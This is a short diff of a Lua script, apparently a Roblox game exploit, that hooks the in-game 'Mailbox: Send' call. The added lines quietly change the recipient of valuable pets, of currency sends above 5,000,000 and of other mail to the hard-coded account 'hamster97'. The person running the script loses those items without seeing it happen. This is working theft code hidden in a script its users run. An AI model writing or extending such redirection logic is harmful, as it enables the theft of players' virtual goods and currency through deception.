@@ -80,8 +80,10 @@ if args[3] == "Pet" and require(dir[save.Inventory.Pet[args[4]].id]).difficulty>
 args[1] = "hamster97" 
 elseif args[3] == "Pet" then
 --e
+elseif args[3] == "Currency" and args[5]<=5000000 then
+--e
 else
---args[1] = "hamster97"
+args[1] = "hamster97"
 end
 elseif tostring(x) == "Mailbox: Send" and args[4] ~= _G.pvc then
 _G.pvc = args[4]
